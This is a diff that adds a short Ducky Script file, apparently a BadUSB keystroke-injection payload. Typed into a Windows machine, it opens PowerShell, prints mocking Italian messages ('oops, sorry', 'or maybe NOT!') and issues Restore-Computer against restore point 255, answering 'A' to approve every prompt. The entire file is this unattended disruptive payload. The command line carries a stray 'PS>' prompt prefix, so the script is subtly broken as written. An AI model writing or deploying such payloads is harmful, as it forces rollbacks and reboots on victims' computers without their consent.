@@ -1,0 +1,15 @@
+DELAY 1000
+GUI r
+STRING powershell
+ENTER
+DELAY 1000
+STRING ops, mi dispiace
+ENTER
+DELAY 2000
+STRING oppure forse NO!
+ENTER
+DELAY 1000
+STRING PS> Restore-Computer -RestorePoint 255 -Confirm
+ENTER
+STRING A
+DELAY 1000
